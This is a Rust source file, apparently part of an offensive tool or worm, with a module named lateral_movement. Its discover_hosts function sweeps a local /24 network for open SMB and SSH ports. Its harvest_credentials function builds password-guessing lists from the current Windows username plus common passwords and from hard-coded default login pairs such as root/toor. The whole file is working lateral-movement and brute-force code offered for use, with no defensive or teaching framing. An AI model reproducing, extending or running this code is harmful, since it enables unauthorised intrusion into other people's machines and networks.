// src/lateral_movement.rs
use std::net::{TcpStream, SocketAddr};
use std::time::Duration;
use log::info;
use local_ip_address::local_ip;

pub struct LateralMovement;

impl LateralMovement {
    pub fn discover_hosts(network: &str, start: u8, end: u8) -> Vec<String> {
        let mut hosts = Vec::new();
        let parts: Vec<&str> = network.split('.').collect();
        if parts.len() != 3 { return hosts; }
        
        let my_ip = local_ip().ok().map(|ip| ip.to_string()).unwrap_or_default();
        if !my_ip.is_empty() {
            info!("Smart scan enabled. My IP: {}. Skipping self.", my_ip);
        }

        let base = format!("{}.{}.{}", parts[0], parts[1], parts[2]);
        
        for i in start..=end {
            let ip = format!("{}.{}", base, i);
            if ip == my_ip { continue; }
            if i == 1 { continue; }

            // Проверяем 445 (SMB) и 22 (SSH)
            if Self::check_port(&ip, 445, 150) || Self::check_port(&ip, 22, 150) {
                info!("Discovered active host: {}", ip);
                hosts.push(ip);
            }
        }
        hosts
    }

    pub fn check_port(ip: &str, port: u16, timeout_ms: u64) -> bool {
        let addr: SocketAddr = format!("{}:{}", ip, port).parse().unwrap_or("0.0.0.0:0".parse().unwrap());
        TcpStream::connect_timeout(&addr, Duration::from_millis(timeout_ms)).is_ok()
    }
    
    pub fn harvest_credentials() -> Vec<(String, String, String)> {
        let mut credentials = Vec::new();

        // 1. Попытка определить ТОЛЬКО текущего пользователя (без домена)
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;
            // Убрали echo %USERDOMAIN%
            if let Ok(res) = Command::new("cmd").args(&["/c", "echo %USERNAME%"]).output() {
                let u = String::from_utf8_lossy(&res.stdout).trim().to_string();
                if !u.is_empty() {
                    let top_passwords = vec!["", "password", "123456", "P@ssw0rd"];
                    for pass in top_passwords {
                        // Третий элемент (домен) теперь всегда пустой
                        credentials.push((u.clone(), pass.to_string(), "".to_string()));
                    }
                }
            }
        }

        // 2. Статические пары логин:пароль
        let pairs = vec![
            ("Administrator", "P@ssw0rd"),
            ("admin", "admin"),
            ("user", "password"),
            ("user", "resu"),
            ("root", "toor"),
            ("suser", "resu"),
            ("suser", "P@ssw0rd"),
        ];

        for (u, p) in pairs {
            credentials.push((u.to_string(), p.to_string(), "".to_string()));
        }
        
        credentials
    }
}